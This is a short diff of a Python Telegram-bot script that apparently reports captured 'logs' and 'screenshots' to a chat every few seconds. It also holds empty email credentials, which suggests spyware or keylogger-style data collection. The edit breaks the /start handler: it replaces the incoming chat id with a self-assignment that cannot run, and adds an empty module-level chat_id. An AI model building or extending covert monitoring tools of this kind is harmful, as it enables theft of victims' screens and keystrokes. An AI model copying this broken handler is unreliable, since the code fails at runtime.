@@ -14,7 +14,7 @@ os.mkdir("logs")
 os.mkdir("screenshots")
 bot = Bot("")
 dp = Dispatcher()
-
+chat_id = ""
 SEND_REPORT_EVERY = 10
 EMAIL_ADDRESS = ""
 EMAIL_PASSWORD = ""
@@ -56,7 +56,7 @@ async def send_periodic_files(chat_id: int, interval: int):
 @dp.message(Command("start"))
 async def start_sending_files(msg: Message):
     global sending_task, is_sending
-    chat_id = msg.chat.id
+    chat_id = chat_id
     interval = 10  # Интервал в секундах
 
     if sending_task is None or sending_task.done():
